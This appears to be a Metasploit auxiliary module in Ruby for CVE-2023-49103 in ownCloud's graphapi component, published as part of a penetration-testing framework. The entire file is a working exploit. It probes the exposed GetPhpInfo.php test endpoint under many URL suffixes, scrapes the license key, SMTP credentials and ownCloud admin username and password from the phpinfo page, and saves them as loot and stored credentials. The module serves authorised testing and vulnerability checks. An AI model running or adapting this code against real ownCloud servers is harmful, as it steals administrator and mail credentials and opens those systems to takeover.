##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'ownCloud Phpinfo Reader',
        'Description' => %q{
          This exploit module illustrates how a vulnerability could be exploited
          in a webapp.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # msf module
          'creacitysec', # original PoC
          'Ron Bowes', # research
          'random-robbie' # additional PoC work and research
        ],
        'References' => [
          [ 'URL', 'https://owncloud.com/security-advisories/disclosure-of-sensitive-credentials-and-configuration-in-containerized-deployments/'],
          [ 'URL', 'https://github.com/creacitysec/CVE-2023-49103'],
          [ 'URL', 'https://www.labs.greynoise.io//grimoire/2023-11-29-owncloud-redux/'],
          [ 'URL', 'https://www.rapid7.com/blog/post/2023/12/01/etr-cve-2023-49103-critical-information-disclosure-in-owncloud-graph-api/'],
          [ 'CVE', '2023-49103']
        ],
        'Targets' => [
          [ 'Automatic Target', {}]
        ],
        'DisclosureDate' => '2023-11-21'
      )
    )
    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('TARGETURI', [ true, 'The URI of ownCloud', '/']),
        OptEnum.new('ROOT', [true, 'Root path to start with', 'all', ['all', '', 'owncloud'] ]),
        OptEnum.new('ENDFILE', [
          true, 'End path to append', 'all', [
            'all', 'css', 'js', 'svg', 'gif', 'png', 'html', 'ttf', 'woff', 'ico', 'jpg',
            'jpeg', 'json', 'properties', 'min.map', 'js.map', 'auto.map'
          ]
        ]),
      ]
    )
  end

  def roots
    if datastore['ROOT'] == 'all'
      return ['', 'owncloud']
    end

    datastore['ROOT']
  end

  def endfiles
    if datastore['ENDFILE'] == 'all'
      return [
        '.css', '.js', '.svg', '.gif', '.png', '.html', '.ttf', '.woff', '.ico', '.jpg',
        '.jpeg', '.json', '.properties', '.min.map', '.js.map', '.auto.map'
      ]
    end
    ".#{datastore['ENDFILE']}"
  end

  def field_regex(field)
    "<tr><td class=\"e\">#{field} <\/td><td class=\"v\">([^ ]+) <\/td><\/tr>"
  end

  def run
    roots.each do |root|
      endfiles.each do |endfile|
        url = normalize_uri(target_uri.path, root, 'apps', 'graphapi', 'vendor', 'microsoft', 'microsoft-graph', 'tests', 'GetPhpInfo.php', endfile)
        vprint_status("Checking: #{url}")
        res = send_request_cgi(
          'uri' => url
        )

        fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
        unless res.code == 200 && res.body.include?('phpinfo()')
          print_bad("Not Exploited - HTTP Status Code: #{res.code}")
          next
        end
        print_good("Found phpinfo page at: #{url}")

        # store page
        l = store_loot(
          'owncloud.phpinfo',
          'text/html',
          rhost,
          res.body,
          'phpinfo.html'
        )
        print_good("Loot stored to: #{l}")

        # process the page

        ## License Key
        print_good("License Key: #{::Regexp.last_match(1)}") if res.body =~ /#{field_regex('OWNCLOUD_LICENSE_KEY')}/

        ## SMTP
        if res.body =~ /#{field_regex('OWNCLOUD_MAIL_SMTP_HOST')}/
          smtp_host = ::Regexp.last_match(1)
          print_good("SMTP Host: #{::Regexp.last_match(1)}")
        end
        if res.body =~ /#{field_regex('OWNCLOUD_MAIL_SMTP_PORT')}/
          smtp_port = ::Regexp.last_match(1)
          print_good("SMTP Port: #{::Regexp.last_match(1)}")
        end
        if res.body =~ /#{field_regex('OWNCLOUD_MAIL_SMTP_NAME')}/
          smtp_username = ::Regexp.last_match(1)
          print_good("SMTP Username: #{::Regexp.last_match(1)}")
        end

        if res.body =~ /#{field_regex('OWNCLOUD_MAIL_SMTP_PASSWORD')}/
          smtp_password = ::Regexp.last_match(1)
          print_good("SMTP Password: #{::Regexp.last_match(1)}")
        end

        if smtp_password
          credential_data = {
            protocol: 'tcp',
            workspace_id: myworkspace_id,
            service_name: 'SMTP',
            origin_type: :service,
            module_fullname: fullname,
            status: Metasploit::Model::Login::Status::UNTRIED,
            private_data: smtp_password,
            private_type: :password
          }
          credential_data[:username] = smtp_username if smtp_username
          credential_data[:address] = smtp_host.nil? ? '127.0.0.1' : smtp_host
          credential_data[:port] = smtp_port.nil? ? 25 : smtp_port

          create_credential(credential_data)
        end

        ## ownCloud
        if res.body =~ /#{field_regex('OWNCLOUD_ADMIN_USERNAME')}/
          owncloud_username = ::Regexp.last_match(1)
          print_good("ownCloud Username: #{::Regexp.last_match(1)}")
        end

        if res.body =~ /#{field_regex('OWNCLOUD_ADMIN_PASSWORD')}/
          owncloud_password = ::Regexp.last_match(1)
          print_good("ownCloud Password: #{::Regexp.last_match(1)}")
        end

        if res.body =~ /#{field_regex('SERVER_PORT')}/
          ::Regexp.last_match(1)
        end

        if owncloud_password
          credential_data = {
            protocol: 'tcp',
            port: rport,
            address: rhost,
            workspace_id: myworkspace_id,
            service_name: 'ownCloud',
            origin_type: :service,
            module_fullname: fullname,
            status: Metasploit::Model::Login::Status::UNTRIED,
            private_data: owncloud_password,
            private_type: :password
          }
          credential_data[:username] = owncloud_username if owncloud_username

          create_credential(credential_data)
        end

        return # no need to keep going, we already got what we wanted
      end
    end
  end
end
